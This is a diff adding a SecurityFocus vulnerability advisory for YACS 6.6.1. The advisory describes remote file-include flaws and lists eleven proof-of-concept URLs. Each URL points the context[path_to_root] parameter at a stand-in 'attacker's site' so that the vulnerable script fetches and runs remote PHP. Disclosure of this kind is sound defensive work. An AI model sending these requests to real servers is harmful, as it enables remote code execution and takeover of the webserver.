@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/19799/info
+
+YACS is prone multiple remote file-include vulnerabilities because the application fails to properly sanitize user-supplied input.
+
+An attacker can exploit these issues to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.
+
+YACS Version 6.6.1 is affected by this vulnerability; other versions may also be affected.
+
+http://www.example.com/articles/article.php?context[path_to_root]=attacker's site
+http://www.example.com/articles/populate.php?context[path_to_root]=attacker's site
+http://www.example.com/categories/category.php?context[path_to_root]=attacker's site
+http://www.example.com/categories/populate.php?context[path_to_root]=attacker's site
+http://www.example.com/comments/populate.php?context[path_to_root]=attacker's site
+http://www.example.com/files/file.php?context[path_to_root]=attacker's site
+http://www.example.com/sections/section.php?context[path_to_root]=attacker's site
+http://www.example.com/sections/populate.php?context[path_to_root]=attacker's site
+http://www.example.com/tables/populate.php?context[path_to_root]=attacker's site
+http://www.example.com/users/user.php?context[path_to_root]=attacker's site
+http://www.example.com/users/populate.php?context[path_to_root]=attacker's site
